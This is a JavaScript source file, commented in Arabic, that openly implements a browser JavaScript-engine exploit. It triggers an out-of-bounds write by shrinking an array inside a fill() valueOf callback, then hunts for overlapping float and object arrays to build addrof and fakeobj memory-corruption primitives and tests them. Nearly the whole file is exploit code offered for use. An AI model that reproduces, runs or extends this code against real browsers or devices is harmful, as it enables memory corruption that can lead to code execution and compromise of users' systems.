import { log, sleep } from './module/utils.mjs';

class AddrofFakeobjExploit {
    constructor() {
        this.float_arr = null;
        this.obj_arr = null;
        this.OVERLAP_IDX = 10; // جرب قيم مختلفة
    }

    async execute() {
        await this.createArraysWithOOB();
        return await this.findCorrectOverlap();
    }

    async createArraysWithOOB() {
        // إنشاء مجموعات متعددة من المصفوفات
        const arrays = [];
        
        for (let i = 0; i < 100; i++) {
            const noCoW = 13.37 + i; // قيم مختلفة لمنع COW
            const float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9];
            const obj_arr = [
                {id: i, mark: 0}, 
                {id: i, mark: 1}, 
                {id: i, mark: 2},
                {id: i, mark: 3},
                {id: i, mark: 4},
                {id: i, mark: 5},
                {id: i, mark: 6},
                {id: i, mark: 7},
                {id: i, mark: 8},
                {id: i, mark: 9}
            ];
            
            arrays.push({float_arr, obj_arr, index: i});
        }

        // Trigger OOB-write
        await this.triggerOOB();
        await sleep(50);
        
        this.arrays = arrays;
    }

    async triggerOOB() {
        const v0 = [];
        for (let i = 0; i < 20000; i++) {
            v0[i] = [1.1, 2.2, 3.3]; // مصفوفات صغيرة
        }
        
        const v10 = {oob: "corruption"};
        
        let shrunk = false;
        const o14 = {
            valueOf: () => {
                if (!shrunk) {
                    v0.length = 100;
                    shrunk = true;
                }
                return 0;
            }
        };
        
        v0.fill(v10, o14);
    }

    async findCorrectOverlap() {
        for (const pair of this.arrays) {
            for (let idx = 8; idx < 20; idx++) { // جرب عدة indexes
                const testObj = {test: 0x1337, unique: Math.random()};
                
                // اختبار addrof
                pair.obj_arr[0] = testObj;
                const addr = pair.float_arr[idx];
                
                if (addr !== undefined && addr !== null && 
                    typeof addr === 'number' && addr !== 0) {
                    
                    // اختبار fakeobj
                    pair.float_arr[idx] = addr;
                    const reconstructed = pair.obj_arr[0];
                    
                    if (reconstructed === testObj) {
                        log(`Found working overlap at index: ${idx}`);
                        log(`addrof result: ${addr}`);
                        
                        this.float_arr = pair.float_arr;
                        this.obj_arr = pair.obj_arr;
                        this.OVERLAP_IDX = idx;
                        
                        return true;
                    }
                }
            }
        }
        
        return false;
    }

    addrof(obj) {
        this.obj_arr[0] = obj;
        const result = this.float_arr[this.OVERLAP_IDX];
        log(`addrof input: ${obj}, output: ${result}`);
        return result;
    }

    fakeobj(addr) {
        this.float_arr[this.OVERLAP_IDX] = addr;
        return this.obj_arr[0];
    }
}

// الاخخدام
async function main() {
    const exploit = new AddrofFakeobjExploit();
    const success = await exploit.execute();
    
    if (success) {
        log("Primitives configured successfully!");
        
        // اختبار مفصل
        const testObj = {data: "test", number: 42};
        
        log("Testing addrof...");
        const addr = exploit.addrof(testObj);
        log(`Address: ${addr} (type: ${typeof addr})`);
        
        log("Testing fakeobj...");
        const fake = exploit.fakeobj(addr);
        log(`Fake object: ${fake}`);
        log(`Comparison: ${fake === testObj}`);
        
    } else {
        log("Failed to find working overlap");
    }
}

main();